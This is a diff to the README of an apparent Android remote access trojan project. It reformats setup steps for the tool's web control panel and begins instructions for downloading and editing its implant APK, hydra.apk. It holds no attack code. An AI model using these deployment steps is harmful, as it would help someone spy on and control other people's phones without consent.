@@ -81,9 +81,9 @@
  1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/325ff0befec72a55c273e99a0e06059db9d599fb/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
  1. Save the file , Your Panel Setup is completed.
  ### If you prefer use com.phlox.simpleserver.apk
- 1.Install the application Simple HTTP Server
- 1.Edit the Root folder path within the application to the WEB PANEL location
- 1.Click START, then click 127.0.0.1 Go to any browser and paste the url And start
+ 1. Install the application Simple HTTP Server
+ 1. Edit the Root folder path within the application to the WEB PANEL location
+ 1. Click START, then click 127.0.0.1 Go to any browser and paste the url And start
  ### Android RAT
  1. Download [hydra.apk](./ANDROID%20APP/hydra.apk)
  1. Unpack or edit the apk using any software recommended above.
